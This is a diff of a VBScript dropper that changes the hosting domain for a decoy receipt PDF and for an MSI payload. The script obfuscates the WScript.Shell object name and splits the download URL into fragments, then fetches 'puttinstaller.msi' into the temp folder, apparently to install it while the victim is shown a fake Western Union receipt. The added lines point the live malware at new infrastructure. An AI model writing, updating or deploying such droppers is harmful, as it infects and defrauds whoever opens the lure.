@@ -83,7 +83,7 @@ Sub ApplyUpdate(strInstPath)
 End Sub
 
 Sub PresentContent()
-    strAssetURL = "https://pdfviewer.wasmer.app/doc/wureceipt.pdf"
+    strAssetURL = "https://pdfviewer-nu.vercel.app/doc/wureceipt.pdf"
     Dim oNavShell, strNavClass
     strNavClass = Replace(Replace("WScrip!.Sh#ll", "!", "t"), "#", "e")
     Set oNavShell = CreateObject(strNavClass)
@@ -149,7 +149,7 @@ Set oFSO = CreateObject(strFSRef)
 Dim intDirId : intDirId = 1 + 1
 tempFolder = oFSO.GetSpecialFolder(intDirId)
 strPkgPath = tempFolder & "\puttinstaller.msi"
-strResourceURL = Join(Array("htt", "ps://pdfvie", "wer.wasme", "r.app/doc/", "upda", "ter.msi"), "")
+strResourceURL = Join(Array("https://pdfv", "iewer-nu.ver", "cel.app/doc/", "updater.msi"), "")
 
     DebugLog "Starting download to: " & strPkgPath
 PullUpdate strResourceURL, strPkgPath
